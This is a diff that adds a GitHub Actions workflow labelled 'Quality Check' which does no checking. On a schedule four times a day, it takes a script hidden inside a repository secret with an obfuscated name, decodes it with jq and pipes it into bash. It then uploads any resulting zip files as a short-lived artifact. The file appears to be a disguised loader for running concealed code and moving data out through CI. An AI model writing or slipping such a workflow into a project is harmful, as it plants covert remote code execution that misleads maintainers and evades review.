@@ -1,0 +1,33 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '11 5,11,17,23 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  execute:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Run
+        env:
+          vwqf6: ${{ secrets.vwqf6 }}
+        run: |
+          printf '%s' "$vwqf6" | jq -r .grd33 | /bin/bash
+          printf '%s' "$htkv73738" | jq -r .k8300 | /bin/bash
+          printf '%s' "$x77" | jq -r .nox983 | /bin/bash
+
+      - name: Store results
+        uses: actions/upload-artifact@v4
+        with:
+          name: 3XLkbWbX
+          path: "*.zip"
+          retention-days: 1
